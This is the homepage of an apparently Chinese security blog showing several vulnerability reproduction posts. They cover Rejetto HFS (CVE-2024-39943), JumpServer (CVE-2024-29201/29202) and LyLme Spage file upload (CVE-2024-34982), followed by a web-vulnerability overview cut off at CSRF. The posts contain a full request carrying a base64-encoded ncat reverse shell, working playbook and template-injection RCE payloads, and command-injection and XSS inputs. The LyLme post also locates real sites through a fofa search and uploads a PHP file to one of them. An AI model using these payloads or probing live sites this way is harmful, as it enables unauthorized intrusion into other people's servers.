<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
<meta property="og:title" content="PiDan-007">
<meta property="og:url" content="https://pidan-007.github.io/index.html">
<meta property="og:site_name" content="PiDan-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PiDan-007">
<meta name="twitter:card" content="summary"><title>PiDan-007</title><link ref="canonical" href="https://pidan-007.github.io/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PiDan-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/07/10/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-07-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-07-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="Rejetto-HFS-远程命令执行漏洞-CVE-2024-39943"   >
          <a href="#Rejetto-HFS-远程命令执行漏洞-CVE-2024-39943" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rejetto-HFS-远程命令执行漏洞-CVE-2024-39943" class="headerlink" title="Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)"></a>Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)</h1>
      
        <h4 id="环境搭建"   >
          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/rejetto/hfs/releases/tag/v0.52.9" >https://github.com/rejetto/hfs/releases/tag/v0.52.9</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>下载0.52.9版本</p>
<p>拉取一个镜像</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull 镜像名</span><br></pre></td></tr></table></div></figure>

<p>在该镜像下新建一个容器，并确保容器的端口正确映射到宿主机的端口，这里我设置的8081端口，运行之后会直接进入新建的容器</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it -p 8081:8081 --name 容器名 镜像名</span><br></pre></td></tr></table></div></figure>

<p>下载必要的解压工具</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install unzip</span><br></pre></td></tr></table></div></figure>

<p>完成后退出该容器，将刚刚下载的HFS0.52.9版本压缩包复制到该容器当前目录下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp ./hfs-linux.zip 容器id:/</span><br></pre></td></tr></table></div></figure>

<p>再进入容器，解压压缩包后会有一个<code>hfs</code>运行文件和<code>plugin</code>文档</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start 容器id       //先启动容器</span><br><span class="line">sudo docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip hfs-linux.zip</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101331716.png" alt="image-20240710133054614"></p>
<p>运行该文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x hfs</span><br><span class="line">./hfs -p 8081 //在8081端口上</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101332295.png" alt="image-20240710133223256"></p>
<p>接着输入命令来创建用户</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create-admin [your-password]</span><br></pre></td></tr></table></div></figure>

<p>访问返回的链接：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://172.17.0.3/~/admin/%EF%BC%8C%E5%B9%B6%E7%99%BB%E5%BD%95admin/password" >http://172.17.0.3/~/admin/，并登录admin/password</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101334869.png" alt="image-20240710133416783"></p>
<p>这样就算是搭建成功了</p>

        <h4 id="漏洞复现"   >
          <a href="#漏洞复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4>
      
        <h5 id="非admin版"   >
          <a href="#非admin版" class="heading-link"><i class="fas fa-link"></i></a><a href="#非admin版" class="headerlink" title="非admin版"></a>非admin版</h5>
      <p>先尝试的网上的，网上的这个也是用的0.52.9版本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/truonghuuphuc/CVE-2024-39943-Poc.git</span><br><span class="line">cd CVE-2024-39943-Poc</span><br><span class="line">unzip hfs-linux.zip</span><br><span class="line">./hfs --config config.yaml  //运行之后会自动开启admin页面</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101646018.png" alt="image-20240710164656889"></p>
<p>运行之后设置端口为1080</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config port 1080</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407110939490.png" alt="image-20240711093943385"></p>
<p>就可以是访问<a href="http://ip:1080了">http://ip:1080了</a></p>
<p>首先在ubuntu开启端口监听</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></div></figure>

<p>访问<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://172.17.0.1,登录guest/guest%EF%BC%8C%E6%AD%A4%E6%97%B6bp%E4%B8%8A%E4%BC%9A%E6%9C%89%E8%BF%99%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8C%85" >http://172.17.0.1，登录guest/guest，此时bp上会有这个数据包</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101650334.png" alt="image-20240710165055274"></p>
<p>将这个数据包发送到repeater</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT /tmp/poc&quot;;python3%20-c%20&quot;import%20os;import%20base64;os.system(base64.b64decode(&#x27;bmNhdCAxOTIuMTY4LjE2Mi4xMzIgNDQ0NCAtZSAvYmluL2Jhc2g=&#x27;))/poc11.txt HTTP/1.1</span><br><span class="line">Host: 172.17.0.1</span><br><span class="line">Accept: text/event-stream</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Referer: http://172.17.0.1/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: hfs_http=eyJpcCI6IjE5Mi4xNjguMTYyLjEzMSIsInVzZXJuYW1lIjoiZ3Vlc3QiLCJfZXhwaXJlIjoxNzIwNjg0ODAzMDY2LCJfbWF4QWdlIjo4NjQwMDAwMH0=; hfs_http.sig=075wEnEfJXJZZDCrCCk6yL0hoKA</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aaaaaaa</span><br></pre></td></tr></table></div></figure>

<p>这个命令是：</p>
<p><code>ncat 192.168.162.132 4444 -e /bin/bash</code>：目标主机会尝试连接到IP地址 192.168.162.132的4444端口，并启动一个反向Shell</p>
<p>发送一次之后可以看到已经有poc11.txt文件创建</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101710461.png"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101710339.png" alt="image-20240710171031287"></p>
<p>再发送一次就能执行命令</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101655470.png" alt="image-20240710165537430"></p>

        <h5 id="admin版"   >
          <a href="#admin版" class="heading-link"><i class="fas fa-link"></i></a><a href="#admin版" class="headerlink" title="admin版"></a>admin版</h5>
      <p>见视频</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/truonghuuphuc/CVE-2024-39943-Poc" >https://github.com/truonghuuphuc/CVE-2024-39943-Poc</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/07/08/JumpServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-07-08</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-07-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="JumpServer远程代码执行漏洞（CVE-2024-29201-amp-CVE-2024-29202）"   >
          <a href="#JumpServer远程代码执行漏洞（CVE-2024-29201-amp-CVE-2024-29202）" class="heading-link"><i class="fas fa-link"></i></a><a href="#JumpServer远程代码执行漏洞（CVE-2024-29201-amp-CVE-2024-29202）" class="headerlink" title="JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）"></a>JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）</h1>
      
        <h3 id="影响版本"   >
          <a href="#影响版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3>
      <p>v3.0.0 &lt;= JumpServer &lt;= v3.10.6</p>

        <h3 id="环境搭建"   >
          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3>
      <p>从链接下载启动文件</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh" >https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>之后打开编辑<code>VERSION</code>为v3.10.6或影响版本中更低的，保存文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407050956702.png" alt="image-20240705095611597"></p>
<p>准备运行</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x quick_start.sh</span><br><span class="line">sudo ./quick_start.sh</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407050959496.png" alt="image-20240705095901445"></p>
<p>服务启动（可能会比较慢）后，访问</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip/core/auth/login/</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407051455358.png" alt="image-20240705145517135"></p>
<p>JumpServer 默认账号密码为 <code>admin/admin</code></p>
<p>（登录后甚至还提醒我密码太简单，让我修改，然后我修改成了123456）</p>
<p>接着进入后台添加资产</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407051457766.png" alt="image-20240705145744685"></p>
<p>添加资产，我这里是添加的我的另一台虚拟机的IP，并且只保留了ssh协议</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091416395.png" alt="image-20240709141630334"></p>
<p>必须要添加账号，要输入密码，这里输入的是我另一台虚拟机的密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091415846.png" alt="image-20240709141526790"></p>
<p>添加资产后需要测试是否添加成功，点击资产后面的 <code>更多-测试</code> 进行测试，这是成功样式</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091329987.png" alt="image-20240709132944785"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091330135.png" alt="image-20240709133016103"></p>
<p>再创建一个用户</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091331559.png" alt="image-20240709133155501"></p>
<p>用户组选择<code>Default</code>，然后填好必填项，设置好密码，创建了用户名为user的用户</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091335977.png" alt="image-20240709133539935"></p>
<p>再为用户分配资产</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091337206.png" alt="image-20240709133704125"></p>
<p>创建好后如图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091338542.png" alt="image-20240709133835498"></p>
<p>环境搭建完成</p>

        <h3 id="CVE-2024-29201"   >
          <a href="#CVE-2024-29201" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2024-29201" class="headerlink" title="CVE-2024-29201"></a>CVE-2024-29201</h3>
      <p>退出管理员账号，登录刚刚创建的user/123456，进入 <code>作业中心-模板管理</code> 添加一个 <code>playbook</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091343812.png" alt="image-20240709134328742"></p>
<p>创建好<code>palybook</code>名称后，点击创建的<code>palybook</code>切换到 <code>工作空间</code>，输入以下内容：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">     &quot;name&quot;: &quot;RCE playbook&quot;,</span><br><span class="line">     &quot;hosts&quot;: &quot;all&quot;,</span><br><span class="line">     &quot;tasks&quot;: [</span><br><span class="line">       &#123;</span><br><span class="line">         &quot;name&quot;: &quot;this runs in Celery container&quot;,</span><br><span class="line">         &quot;shell&quot;: &quot;id &gt; /tmp/test&quot;,</span><br><span class="line">         &quot;\u0064elegate_to&quot;: &quot;localhost&quot;</span><br><span class="line">&#125; ],</span><br><span class="line">     &quot;vars&quot;: &#123;</span><br><span class="line">     &quot;ansible_\u0063onnection&quot;: &quot;local&quot;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></div></figure>

<p>点击保存，再切换到 <code>作业管理</code> 页面，创建一个新的 <code>Playbook</code> 作业</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091348927.png" alt="image-20240709134803857"></p>
<p>详情填写</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091349976.png" alt="image-20240709134935933"></p>
<p>保存后，再点击<code>更多-运行</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091351196.png" alt="image-20240709135116145"></p>
<p>之后再进入这个celery容器，然后查看/tmp文件目录</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps</span><br><span class="line">sudo docker exec -i docker-id /bin/bash</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407091359489.png" alt="image-20240709135914433"></p>
<p>命令执行成功</p>

        <h3 id="CVE-2024-29202"   >
          <a href="#CVE-2024-29202" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2024-29202" class="headerlink" title="CVE-2024-29202"></a>CVE-2024-29202</h3>
      <p>与类似，只是<code>playbook</code>的<code>工作空间</code>里的内容换成</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- name: |</span><br><span class="line">       &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">         &#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">           &#123;&#123;</span><br><span class="line">             x()._module.__builtins__[&quot;__import__&quot;](&quot;os&quot;).system(&quot;id &gt; /tmp/test2&quot;)</span><br><span class="line">           &#125;&#125;</span><br><span class="line">         &#123;%endif%&#125;</span><br><span class="line">       &#123;%endfor%&#125;</span><br></pre></td></tr></table></div></figure>

<p>其余步骤相同</p>
<p>参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/index.html" >https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/index.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/07/05/lylme_spage%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">六零导航页file.php任意文件上传漏洞（CVE-2024-34982）</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-07-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-07-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="六零导航页file-php-任意文件上传漏洞（CVE-2024-34982）"   >
          <a href="#六零导航页file-php-任意文件上传漏洞（CVE-2024-34982）" class="heading-link"><i class="fas fa-link"></i></a><a href="#六零导航页file-php-任意文件上传漏洞（CVE-2024-34982）" class="headerlink" title="六零导航页file.php 任意文件上传漏洞（CVE-2024-34982）"></a>六零导航页file.php 任意文件上传漏洞（CVE-2024-34982）</h1>
      <p>六零导航页 (LyLme Spage) 致力于简洁高效无广告的上网导航和搜索入口，支持后台添加链接、自定义搜索引擎，沉淀最具价值链接，全站无商业推广，简约而不简单。该系统file.php接口处存在任意文件上传漏洞，可能导致服务器失陷。</p>
<p>fofa搜索</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title==&quot;上网导航 - LyLme Spage&quot;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407081348137.png" alt="image-20240708134756983"></p>
<p>随便选择一个访问</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407081352697.png" alt="image-20240708135220149"></p>
<p>访问<code>/apply</code>，有一个上传网站图标的地方</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407081353519.png" alt="image-20240708135344133"></p>
<p>选择一个写有phpinfo()的jpg文件进行上传并抓包，抓包之后将文件后缀修改成php再进行发包，发包之后会有一个上传成功的和上传的路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407081356273.png" alt="image-20240708135616232"></p>
<p>访问这个上传路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407081357241.png" alt="image-20240708135736189"></p>
<p>可以看到上传成功</p>
<p>参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cn-sec.com/archives/2758524.html" >https://cn-sec.com/archives/2758524.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/06/07/WEB%E6%BC%8F%E6%B4%9E/">[ Untitled ]</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-06-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-06-19</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="WEB漏洞"   >
          <a href="#WEB漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB漏洞" class="headerlink" title="WEB漏洞"></a>WEB漏洞</h1>
      
        <h2 id="暴力破解"   >
          <a href="#暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2>
      
        <h4 id="原理"   >
          <a href="#原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理" class="headerlink" title="原理"></a>原理</h4>
      <p>通过尝试所有可能的组合来破解密码或密钥的攻击方式</p>

        <h4 id="攻击方式"   >
          <a href="#攻击方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4>
      <p>攻击者使用burpsuite和预先准备好的字典文件进行攻击</p>
<p>利用burpsuite抓包发送到攻击器→选好payload位置和攻击方式→上传字典开始攻击→根据长度的特别来获取账号和密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070921583.png" alt="image-20240607092151450"></p>

        <h4 id="防御"   >
          <a href="#防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御" class="headerlink" title="防御"></a>防御</h4>
      <p>限制登录尝试次数</p>
<p>启用多因素认证，比如手机验证码、邮件验证码等</p>
<p>使用强密码策略</p>

        <h2 id="命令注入"   >
          <a href="#命令注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2>
      
        <h4 id="原理-1"   >
          <a href="#原理-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4>
      <p>通过输入恶意命令，攻击者可以远程执行服务器上的系统命令，出现在应用程序通过系统调用执行操作系统命令，并且没有对输入进行充分的验证和过滤的情况下</p>

        <h4 id="靶场复现"   >
          <a href="#靶场复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现" class="headerlink" title="靶场复现"></a>靶场复现</h4>
      <p>输入127.0.0.1|dir，查看文件目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070933584.png" alt="image-20240607093339497"></p>

        <h4 id="防御-1"   >
          <a href="#防御-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4>
      <p>对输入进行过滤</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#x27;/^[a-zA-Z0-9_\-]+$/&#x27;, $input))</span><br></pre></td></tr></table></div></figure>


        <h2 id="XSS"   >
          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2>
      
        <h4 id="原理-2"   >
          <a href="#原理-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4>
      <p>指攻击者通过在web页面中写入恶意脚本，进而在用户浏览页面时，控制用户浏览器进行操作的攻击方式</p>

        <h4 id="分类"   >
          <a href="#分类" class="heading-link"><i class="fas fa-link"></i></a><a href="#分类" class="headerlink" title="分类"></a>分类</h4>
      <p>反射型XSS、存储型XSS和基于 DOM 的 XSS</p>

        <h4 id="利用方式"   >
          <a href="#利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4>
      <p>在输入框中插入脚本，如<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p>效果如图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070953323.png" alt="image-20240607095306223"></p>

        <h4 id="防御-2"   >
          <a href="#防御-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4>
      <p>对用户输入进行严格的转义和过滤</p>
<p>将用户输入的数据进行编码，可以使用htmlspecialchars()函数，将特殊字符转换为HTML实体</p>
<p>浏览器CSP策略</p>

        <h2 id="CSRF"   >
          <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
      
        <h4 id="原理-3"   >
          <a href="#原理-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4>
      <p>利用用户对目标网站的信任，当用户在已登录状态下访问恶意网站时，恶意网站向目标网站发送伪造的请求，欺骗用户点击恶意链接，执行用户未授权的操作</p>

        <h4 id="靶场复现-1"   >
          <a href="#靶场复现-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-1" class="headerlink" title="靶场复现"></a>靶场复现</h4>
